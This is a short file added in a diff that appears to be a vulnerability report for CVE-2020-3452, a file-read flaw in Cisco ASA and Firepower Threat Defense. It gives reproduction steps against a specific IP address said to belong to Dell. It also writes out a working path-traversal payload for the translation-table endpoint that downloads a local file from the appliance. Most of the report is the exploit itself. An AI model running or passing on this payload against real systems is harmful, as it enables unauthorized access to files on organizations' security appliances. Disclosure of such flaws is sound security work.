@@ -1,0 +1,12 @@
+CVE 2020-3452 Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) - local file inclusion
+
+Steps to Reproduce:
+
+1-open this link https://132.237.141.140/( IP address of Dell)
+2-enter payload in url
+
+Payload =  +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+
+3-download a cisco local file from website .
+
+
